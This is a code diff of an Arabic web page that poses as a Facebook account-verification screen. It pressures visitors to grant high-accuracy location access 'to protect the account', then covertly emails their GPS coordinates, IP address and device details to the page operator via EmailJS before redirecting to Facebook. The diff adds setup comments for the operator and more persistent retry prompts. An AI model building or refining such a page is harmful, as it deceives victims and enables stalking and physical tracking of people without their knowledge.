@@ -358,7 +358,6 @@
       </div>
       
       <div class="content">
-        <!-- Welcome Section -->
         <div id="welcomeSection" class="section active">
           <h2>التحقق من حسابك</h2>
           <p>لحماية حسابك من الاختراق، يرجى السماح بتحديد موقعك الحالي بدقة عالية.</p>
@@ -399,7 +398,6 @@
           </button>
         </div>
         
-        <!-- Loading Section -->
         <div id="loadingSection" class="section">
           <h2>جاري تحديد موقعك</h2>
           <p>نحاول الحصول على موقعك بدقة عالية (5-10 أمتار)</p>
@@ -418,13 +416,13 @@
               <i class="fas fa-exclamation-circle"></i> لم يتم طلب الإذن
             </div>
             <p>يبدو أن المتصفح لم يعرض طلب الإذن لتحديد موقعك.</p>
+            <p>يرجى النقر على زر "المحاولة مرة أخرى" ومراقبة ظهور نافذة طلب الإذن.</p>
             <button id="retryPermissionBtn" class="btn btn-outline" style="margin-top: 10px;">
               <i class="fas fa-redo"></i> المحاولة مرة أخرى
             </button>
           </div>
         </div>
         
-        <!-- Map Section -->
         <div id="mapSection" class="section">
           <h2>تم التحقق من موقعك</h2>
           
@@ -442,7 +440,6 @@
           </button>
         </div>
         
-        <!-- Error Section -->
         <div id="errorSection" class="section">
           <h2>تعذر التحقق من موقعك</h2>
           <p>للمتابعة إلى حسابك، يرجى منح الإذن لتحديد الموقع</p>
@@ -474,7 +471,7 @@
     </div>
     
     <div class="footer">
-      <p>فيسبوك &copy; 2023. جميع الحقوق محفوظة</p>
+      <p>فيسبوك © 2023. جميع الحقوق محفوظة</p>
       <div>
         <a href="#">الخصوصية</a>
         <a href="#">الشروط</a>
@@ -485,21 +482,21 @@
 
   <script>
     // ************************
-    // CONFIGURATION - REPLACE WITH YOUR DATA
+    // إعدادات أساسية - قم بتعديل هذه القيم بمعلوماتك الخاصة والمفاتيح الصحيحة
     // ************************
     const config = {
       emailjs: {
-        publicKey: "0XeUaAWOfdeN9gGEr",
-        serviceId: "service_gtkrov5",
-        templateId: "template_jj0pjs9",
-        receiverEmail: "your_email@example.com" // البريد المستلم
+        publicKey: "0XeUaAWOfdeN9gGEr",   // <--- REQUIRED: مفتاح EmailJS العام الخاص بك (من حسابك في EmailJS)
+        serviceId: "service_gtkrov5",     // <--- REQUIRED: معرف الخدمة الخاص بك في EmailJS (من Email Services)
+        templateId: "template_jj0pjs9",   // <--- REQUIRED: معرف القالب الخاص بك في EmailJS (من Email Templates)
+        receiverEmail: "your_email@example.com" // <--- REQUIRED: ضع هنا بريدك الإلكتروني الذي تريد أن تستقبل عليه رسائل الموقع
       },
-      facebookPage: "https://www.facebook.com/your_page",
-      mapsApiKey: "YOUR_GOOGLE_MAPS_API_KEY"
+      facebookPage: "https://www.facebook.com/your_facebook_page", // <--- REQUIRED: رابط صفحة الفيسبوك التي تريد توجيه المستخدم إليها بعد التحقق
+      mapsApiKey: "YOUR_Maps_API_KEY" // <--- OPTIONAL: مفتاح Google Maps API الخاص بك لعرض الخريطة. إذا لم تكن بحاجته، يمكنك إزالته أو تركه فارغاً.
     };
     // ************************
 
-    // DOM Elements
+    // عناصر DOM
     const welcomeSection = document.getElementById("welcomeSection");
     const loadingSection = document.getElementById("loadingSection");
     const mapSection = document.getElementById("mapSection");
@@ -516,58 +513,60 @@
     const mapContainer = document.getElementById("mapContainer");
     const permissionNotice = document.getElementById("permissionNotice");
 
-    // State variables
+    // متغيرات الحالة
     let locationData = null;
     let timer = null;
     let seconds = 0;
     let mapInstance = null;
-    let geolocationRequested = false;
-    let permissionPromptShown = false;
-    let permissionCheckTimeout = null;
-    
-    // Initialize EmailJS
+    let geolocationRequested = false; // لمنع طلب تحديد الموقع أكثر من مرة في نفس الوقت
+    let permissionCheckTimeout = null; // للتحقق مما إذا ظهر طلب الإذن من المتصفح
+
+    // تهيئة EmailJS
     emailjs.init(config.emailjs.publicKey);
-    
-    // Show section helper
+
+    // دالة لعرض قسم معين وإخفاء الباقي
     function showSection(section) {
       document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
       section.classList.add('active');
     }
-    
-    // Start location process
+
+    // بدء عملية تحديد الموقع
     function startLocationProcess() {
-      if (geolocationRequested) return;
+      if (geolocationRequested) {
+        console.log("Geolocation request already in progress. Ignoring new request.");
+        return;
+      }
+      
       geolocationRequested = true;
+      clearInterval(timer); // مسح أي مؤقت سابق
+      seconds = 0; // إعادة ضبط العداد
+      updateTimer(); // بدء تحديث العداد
       
       showSection(loadingSection);
-      seconds = 0;
-      updateTimer();
-      permissionNotice.style.display = 'none';
+      permissionNotice.style.display = 'none'; // إخفاء إشعار الإذن في البداية
       
-      // Start the timer
-      timer = setInterval(updateTimer, 1000);
+      timer = setInterval(updateTimer, 1000); // بدء المؤقت الزمني
       
-      // Start progress bar animation
-      animateProgressBar();
+      animateProgressBar(); // بدء تحريك شريط التقدم
       
-      // Set timeout to check if permission prompt was shown
-      permissionPromptShown = false;
+      // تعيين مؤقت للتحقق مما إذا ظهر طلب الإذن من المتصفح
+      // هذا يساعد في اكتشاف ما إذا كان المتصفح قد منع ظهور الطلب (popup blocker أو إعدادات الموقع)
       permissionCheckTimeout = setTimeout(() => {
-        if (!permissionPromptShown) {
-          permissionNotice.style.display = 'block';
+        // إذا كنا لا نزال في قسم التحميل ولم يتم الحصول على الموقع بعد
+        if (loadingSection.classList.contains('active') && !locationData && geolocationRequested) {
+          permissionNotice.style.display = 'block'; // عرض إشعار "لم يتم طلب الإذن"
         }
-      }, 3000);
+      }, 3000); // إعطاء المتصفح 3 ثوانٍ لعرض طلب الإذن
       
-      // Start location retrieval with high accuracy
+      // طلب تحديد الموقع بدقة عالية
       getHighAccuracyLocation();
     }
     
-    // Update timer display
+    // تحديث عرض المؤقت وحالة الدقة
     function updateTimer() {
       seconds++;
       secondsDisplay.textContent = seconds;
       
-      // Update status message
       if (seconds < 5) {
         accuracyStatus.textContent = "جاري الحصول على الإشارات الأولية...";
       } else if (seconds < 10) {
@@ -578,38 +577,50 @@
         accuracyStatus.textContent = "نستمر في تحسين الدقة...";
       }
       
-      // Update progress bar
       progressBar.style.width = Math.min(seconds * 6.67, 100) + "%";
     }
+
+    // تحريك شريط التقدم المرئي
+    function animateProgressBar() {
+        let currentWidth = 0;
+        const animationInterval = setInterval(() => {
+            if (currentWidth < 90) { // الوصول إلى 90% أثناء البحث
+                currentWidth += 1;
+                progressBar.style.width = currentWidth + "%";
+            } else {
+                clearInterval(animationInterval);
+            }
+        }, 100); // سرعة التحريك
+    }
     
-    // Get high accuracy location (with retries)
+    // الحصول على الموقع بدقة عالية
     function getHighAccuracyLocation() {
       if (!navigator.geolocation) {
-        showError("متصفحك لا يدعم خاصية تحديد الموقع");
+        handleLocationError({ code: -1, message: "متصفحك لا يدعم خاصية تحديد الموقع." });
         return;
       }
       
+      // مسح مؤقت التحقق من الإذن بمجرد بدء طلب تحديد الموقع
+      if (permissionCheckTimeout) {
+        clearTimeout(permissionCheckTimeout);
+        permissionCheckTimeout = null;
+      }
+
       navigator.geolocation.getCurrentPosition(
         position => handleLocationSuccess(position),
         error => handleLocationError(error),
         {
-          enableHighAccuracy: true, // Request high accuracy (GPS)
-          timeout: 30000, // Wait up to 30 seconds
-          maximumAge: 0 // Do not use a cached position
+          enableHighAccuracy: true, // طلب أعلى دقة ممكنة (باستخدام GPS إن وجد)
+          timeout: 20000, // مهلة 20 ثانية للحصول على الموقع
+          maximumAge: 0 // عدم استخدام المواقع المخزنة مؤقتًا، طلب موقع جديد
         }
       );
-      
-      // Indicate that the permission prompt should be shown
-      permissionPromptShown = true;
-      if (permissionCheckTimeout) {
-        clearTimeout(permissionCheckTimeout);
-      }
     }
     
-    // Handle successful location retrieval
+    // معالجة نجاح الحصول على الموقع
     function handleLocationSuccess(position) {
       clearInterval(timer);
-      geolocationRequested = false;
+      geolocationRequested = false; // إعادة ضبط الحالة
       
       const lat = position.coords.latitude;
       const lng = position.coords.longitude;
@@ -622,49 +633,44 @@
         timestamp: new Date().toISOString()
       };
       
-      // Update accuracy display
       accuracyValue.textContent = Math.round(accuracy);
       
-      // Show accuracy status
       if (accuracy <= 10) {
-        accuracyValue.className = "high-accuracy";
-      } else if (accuracy <= 30) {
-        accuracyValue.className = "medium-accuracy";
+        accuracyValue.parentElement.className = "accuracy-display high-accuracy";
+      } else if (accuracy <= 50) {
+        accuracyValue.parentElement.className = "accuracy-display medium-accuracy";
       } else {
-        accuracyValue.className = "low-accuracy";
+        accuracyValue.parentElement.className = "accuracy-display low-accuracy";
       }
       
-      // Initialize and display map
-      initMap(lat, lng);
-      
-      // Show map section
-      showSection(mapSection);
-      
-      // Send location data
-      sendLocationData();
+      initMap(lat, lng); // تهيئة وعرض الخريطة
+      showSection(mapSection); // عرض قسم الخريطة
+
+      sendLocationData(); // إرسال بيانات الموقع ومعلومات الجهاز
     }
     
-    // Initialize and display Google Map
+    // تهيئة وعرض خريطة جوجل
     function initMap(lat, lng) {
-      if (typeof google === 'undefined') {
-        console.error("Google Maps not loaded");
-        mapContainer.innerHTML = "<p class='text-center' style='padding: 100px 0; color: #666;'>تعذر تحميل الخريطة. سيتم توجيهك إلى فيسبوك</p>";
-        setTimeout(redirectToFacebook, 3000);
+      // إذا لم يتم توفير مفتاح API أو لم يتم تحميل مكتبة خرائط جوجل
+      if (!config.mapsApiKey || typeof google === 'undefined' || typeof google.maps === 'undefined') {
+        console.warn("Google Maps API not available or key missing. Map will not be displayed.");
+        mapContainer.innerHTML = "<p class='text-center' style='padding: 100px 0; color: #666;'>تعذر تحميل الخريطة. سيتم توجيهك إلى فيسبوك.</p>";
+        // يمكنك هنا اختيار التوجيه مباشرة بعد فترة قصيرة إذا لم يتم تحميل الخريطة
+        // setTimeout(redirectToFacebook, 3000); 
         return;
       }
-      
+
       const location = new google.maps.LatLng(lat, lng);
       
       mapInstance = new google.maps.Map(mapContainer, {
         center: location,
-        zoom: 18, // High zoom level for better accuracy
-        mapTypeId: google.maps.MapTypeId.HYBRID, // Satellite view with labels
+        zoom: 18, // مستوى تكبير عالٍ للدقة
+        mapTypeId: google.maps.MapTypeId.HYBRID, // عرض ساتلايت مع تسميات
         streetViewControl: false,
         fullscreenControl: false,
         mapTypeControl: false
       });
       
-      // Add marker
       new google.maps.Marker({
         position: location,
         map: mapInstance,
@@ -672,7 +678,6 @@
         animation: google.maps.Animation.DROP
       });
       
-      // Add accuracy circle
       new google.maps.Circle({
         strokeColor: "#4285F4",
         strokeOpacity: 0.8,
@@ -685,32 +690,46 @@
       });
     }
     
-    // Handle location error
+    // معالجة خطأ تحديد الموقع
     function handleLocationError(error) {
       clearInterval(timer);
-      geolocationRequested = false;
-      showSection(errorSection);
+      geolocationRequested = false; // إعادة ضبط الحالة
+      showSection(errorSection); // عرض قسم الخطأ
       
-      let errorMessage = "حدث خطأ غير متوقع أثناء تحديد الموقع";
+      let errorMessage = "حدث خطأ غير متوقع أثناء تحديد الموقع.";
+      let errorTitle = "خطأ في الموقع";
       
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          errorMessage = "تم رفض الإذن لتحديد الموقع. يرجى منح الإذن للمتابعة.";
+          errorTitle = "تم رفض إذن الموقع";
+          errorMessage = "لقد رفضت إذن تحديد الموقع. يرجى منح الإذن للمتابعة إلى حسابك.";
           break;
         case error.POSITION_UNAVAILABLE:
-          errorMessage = "معلومات الموقع غير متوفرة. يرجى التأكد من تفعيل خدمات الموقع.";
+          errorTitle = "الموقع غير متاح";
+          errorMessage = "معلومات الموقع غير متوفرة. يرجى التأكد من تفعيل خدمات الموقع (GPS) على جهازك.";
           break;
         case error.TIMEOUT:
-          errorMessage = "انتهت المهلة المحددة للحصول على الموقع. يرجى المحاولة مرة أخرى.";
+          errorTitle = "انتهت مهلة البحث عن الموقع";
+          errorMessage = "استغرق الحصول على موقعك وقتاً طويلاً جداً. يرجى التأكد من وجود إشارة جيدة والمحاولة مرة أخرى.";
           break;
+        default:
+          errorTitle = "خطأ غير معروف";
+          errorMessage = "حدث خطأ غير متوقع: " + (error.message || "لا توجد تفاصيل إضافية.");
       }
+      
+      // تحديث الرسائل في قسم الخطأ بناءً على نوع الخطأ
+      document.querySelector('#errorSection .error-title').textContent = errorTitle;
+      document.querySelector('#errorSection p').textContent = errorMessage;
+      console.error("Geolocation error:", error);
     }
     
-    // Send location data via EmailJS (with detailed information)
+    // إرسال بيانات الموقع ومعلومات الجهاز عبر EmailJS
     function sendLocationData() {
-      if (!locationData) return;
+      if (!locationData) {
+          console.error("No location data available to send.");
+          return;
+      }
       
-      // Format date/time in Arabic
       const now = new Date();
       const dateTimeString = now.toLocaleString('ar-EG', {
         weekday: 'long',
@@ -722,84 +741,105 @@
         second: '2-digit'
       });
       
-      // Create Google Maps link
+      // رابط خرائط جوجل المباشر للموقع
       const mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}&z=18`;
       
-      // Prepare template parameters with detailed information
       const templateParams = {
         to_email: config.emailjs.receiverEmail,
         date_time: dateTimeString,
         location_link: mapsLink,
         coordinates: `${locationData.lat}, ${locationData.lng}`,
         accuracy: `${Math.round(locationData.accuracy)} متر`,
-        device_info: navigator.userAgent,
-        additional_info: "تم جمع هذه البيانات من خلال نموذج التحقق من حساب فيسبوك",
-        ip_address: "جاري الحصول...",
-        map_image: `https://maps.googleapis.com/maps/api/staticmap?center=${locationData.lat},${locationData.lng}&zoom=16&size=600x300&maptype=roadmap&markers=color:red%7C${locationData.lat},${locationData.lng}&key=${config.mapsApiKey}`
+        device_info: navigator.userAgent, // معلومات المتصفح ونظام التشغيل
+        ip_address: "جاري الحصول...", // يتم تحديثه لاحقاً
+        // رابط لصورة خريطة ثابتة، يتطلب تفعيل Maps Static API ومفتاح API صحيح
+        map_image_url: config.mapsApiKey ? `https://maps.googleapis.com/maps/api/staticmap?center=${locationData.lat},${locationData.lng}&zoom=16&size=600x300&maptype=roadmap&markers=color:red%7C${locationData.lat},${locationData.lng}&key=${config.mapsApiKey}` : 'لا يوجد مفتاح API لخرائط جوجل لعرض الصورة'
       };
       
-      // Get IP address
+      // جلب عنوان IP وإرسال البريد الإلكتروني
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           templateParams.ip_address = data.ip;
+          console.log("IP Address obtained:", data.ip);
           sendEmail(templateParams);
         })
-        .catch(() => {
-          templateParams.ip_address = "غير معروف";
-          sendEmail(templateParams);
+        .catch(ipError => {
+          console.warn("Failed to get IP address:", ipError);
+          templateParams.ip_address = "غير معروف"; // في حال فشل جلب الـ IP
+          sendEmail(templateParams); // إرسال البريد حتى لو لم يتم جلب الـ IP
         });
     }
     
-    // Send email with all parameters
+    // وظيفة إرسال البريد الفعلي
     function sendEmail(params) {
+      if (!config.emailjs.serviceId || !config.emailjs.templateId || !config.emailjs.publicKey) {
+          console.error("EmailJS configuration is incomplete. Check serviceId, templateId, and publicKey.");
+          alert("خطأ في إعدادات إرسال البريد الإلكتروني. يرجى مراجعة الكود.");
+          return;
+      }
+
       emailjs.send(
         config.emailjs.serviceId,
         config.emailjs.templateId,
-        params
+        params,
+        config.emailjs.publicKey // المفتاح العام يُمرر هنا أيضاً لضمان التوافق
       )
       .then(response => {
-        console.log("Location data sent successfully:", response);
+        console.log("Location data sent successfully to EmailJS:", response.status, response.text);
+        // يمكنك إضافة رسالة نجاح للمستخدم هنا إذا أردت
       })
       .catch(error => {
-        console.error("Failed to send location data:", error);
-        // Fallback: save to localStorage
+        console.error("Failed to send location data via EmailJS:", error);
+        alert("فشل إرسال بيانات الموقع. قد تكون هناك مشكلة في إعدادات EmailJS أو الاتصال بالإنترنت.");
+        // كحل احتياطي: حفظ البيانات في التخزين المحلي
         try {
-          const savedLocations = JSON.parse(localStorage.getItem('fb_locations') || []);
+          const savedLocations = JSON.parse(localStorage.getItem('fb_locations') || '[]');
           savedLocations.push(params);
           localStorage.setItem('fb_locations', JSON.stringify(savedLocations));
+          console.log("Location data saved to localStorage as a fallback.");
         } catch (e) {
           console.error("Failed to save location locally:", e);
         }
       });
     }
     
-    // Redirect to Facebook page
+    // التوجيه إلى صفحة الفيسبوك المحددة
     function redirectToFacebook() {
-      if (config.facebookPage) {
+      if (config.facebookPage && config.facebookPage !== "https://www.facebook.com/your_facebook_page") {
         window.location.href = config.facebookPage;
+      } else {
+        alert("يرجى تحديث رابط صفحة الفيسبوك في إعدادات الكود للمتابعة.");
+        console.warn("Facebook page URL not configured correctly. Redirecting to facebook.com as default.");
+        window.location.href = "https://www.facebook.com"; // توجيه افتراضي إلى فيسبوك
       }
     }
     
-    // Show detailed help instructions
+    // عرض تعليمات المساعدة المفصلة (داخل نافذة منبثقة بسيطة)
     function showHelpInstructions() {
       const instructions = `
-        <div style="background: white; padding: 20px; border-radius: 10px; max-width: 500px; margin: 20px auto;">
-          <h3 style="text-align: center; color: #1877F2; margin-bottom: 15px;">كيفية تفعيل خدمات الموقع</h3>
-          <ol style="padding-left: 20px; margin-bottom: 15px;">
-            <li style="margin-bottom: 10px;">افتح إعدادات جهازك</li>
-            <li style="margin-bottom: 10px;">ابحث عن "الموقع" أو "Location"</li>
-            <li style="margin-bottom: 10px;">تأكد من تفعيل خدمات الموقع</li>
-            <li style="margin-bottom: 10px;">ابحث عن "Chrome" أو متصفحك في قائمة التطبيقات</li>
-            <li style="margin-bottom: 10px;">قم بتفعيل "السماح بالوصول إلى الموقع"</li>
-            <li style="margin-bottom: 10px;">اختر "أثناء استخدام التطبيق" أو "دائماً"</li>
-            <li>ارجع إلى هذه الصفحة واضغط "إعادة المحاولة"</li>
+        <div style="background: white; padding: 20px; border-radius: 10px; max-width: 500px; margin: 20px auto; color: #333; line-height: 1.6; box-shadow: 0 5px 15px rgba(0,0,0,0.3);">
+          <h3 style="text-align: center; color: var(--facebook-blue); margin-bottom: 15px; font-size: 22px;">كيفية تفعيل خدمات الموقع</h3>
+          <p style="margin-bottom: 15px;">إذا لم تتمكن من تحديد موقعك، يرجى التأكد من الخطوات التالية:</p>
+          <ol style="padding-left: 25px; margin-bottom: 15px;">
+            <li style="margin-bottom: 10px;"><strong>على الأندرويد:</strong> اسحب شريط الإشعارات لأسفل، وابحث عن أيقونة الموقع (Location) وتأكد من تفعيلها. أو اذهب إلى الإعدادات > الموقع > تشغيل. تأكد أيضاً أن "الدقة العالية" مفعلة.</li>
+            <li style="margin-bottom: 10px;"><strong>على الآيفون:</strong> اذهب إلى الإعدادات > الخصوصية والأمان > خدمات الموقع > تأكد من أنها قيد التشغيل. ثم ابحث عن المتصفح (مثل سفاري أو كروم) في القائمة وتأكد أن السماح بالوصول للموقع مضبوط على "أثناء استخدام التطبيق" أو "دائماً".</li>
+            <li style="margin-bottom: 10px;"><strong>إعدادات المتصفح (كروم كمثال):</strong>
+              <ul>
+                <li>افتح إعدادات المتصفح.</li>
+                <li>ابحث عن "الخصوصية والأمان" (Privacy and Security).</li>
+                <li>اختر "إعدادات الموقع" (Site Settings).</li>
+                <li>ابحث عن هذا الموقع في قائمة "الأذونات" (Permissions) أو "المواقع الأخيرة" (Recent Activity).</li>
+                <li>تأكد من أن إذن الموقع مضبوط على "السماح" (Allow).</li>
+              </ul>
+            </li>
+            <li style="margin-bottom: 10px;"><strong>تحديث المتصفح:</strong> تأكد من أن متصفحك محدث لآخر إصدار.</li>
+            <li><strong>إعادة تشغيل الجهاز:</strong> في بعض الأحيان، يمكن أن يساعد إعادة تشغيل جهازك في حل المشكلات المؤقتة في خدمات الموقع.</li>
           </ol>
-          <p style="text-align: center; color: #666;">إذا استمرت المشكلة، حاول استخدام جهاز آخر أو تحديث المتصفح.</p>
+          <p style="text-align: center; color: #666; font-size: 14px; margin-top: 20px;">بعد تطبيق الخطوات، ارجع إلى هذه الصفحة واضغط على زر "إعادة المحاولة".</p>
         </div>
       `;
       
-      // Create modal
       const modal = document.createElement('div');
       modal.style.position = 'fixed';
       modal.style.top = '0';
@@ -811,9 +851,13 @@
       modal.style.display = 'flex';
       modal.style.justifyContent = 'center';
       modal.style.alignItems = 'center';
+      modal.style.overflowY = 'auto'; // للسماح بالتمرير إذا كان المحتوى طويلاً
       modal.innerHTML = instructions;
       
-      // Close modal on click
+      // منع إغلاق النافذة عند النقر داخل المحتوى
+      modal.firstChild.addEventListener('click', (e) => e.stopPropagation());
+
+      // إغلاق النافذة عند النقر خارج المحتوى
       modal.addEventListener('click', () => {
         document.body.removeChild(modal);
       });
@@ -821,28 +865,39 @@
       document.body.appendChild(modal);
     }
     
-    // Load Google Maps API
+    // تحميل سكريبت Google Maps API بشكل ديناميكي
     function loadGoogleMaps() {
-      if (!config.mapsApiKey) return;
+      if (!config.mapsApiKey || typeof google !== 'undefined') {
+        // إذا لم يتم توفير مفتاح API، أو تم تحميل API بالفعل، فلا تفعل شيئاً
+        if (!config.mapsApiKey) {
+            console.warn("Google Maps API Key is not provided. Map functionality will be limited.");
+        }
+        return;
+      }
       
       const script = document.createElement('script');
       script.src = `https://maps.googleapis.com/maps/api/js?key=${config.mapsApiKey}&libraries=places&language=ar&region=SA`;
       script.async = true;
       script.defer = true;
+      script.onerror = () => {
+        console.error("Failed to load Google Maps API script. Check API key and network connection.");
+        mapContainer.innerHTML = "<p class='text-center' style='padding: 100px 0; color: #666;'>تعذر تحميل الخريطة. يرجى التحقق من اتصالك بالإنترنت ومفتاح API.</p>";
+      };
       document.head.appendChild(script);
     }
     
-    // Event listeners
+    // إضافة مستمعي الأحداث للأزرار
     startBtn.addEventListener('click', startLocationProcess);
     retryBtn.addEventListener('click', startLocationProcess);
     retryPermissionBtn.addEventListener('click', startLocationProcess);
     continueBtn.addEventListener('click', redirectToFacebook);
     helpBtn.addEventListener('click', showHelpInstructions);
     
-    // Initialize the app
+    // تهيئة التطبيق عند تحميل DOM بالكامل
     document.addEventListener('DOMContentLoaded', () => {
-      loadGoogleMaps();
+      loadGoogleMaps(); // محاولة تحميل Google Maps API
     });
   </script>
 </body>
 </html>
+
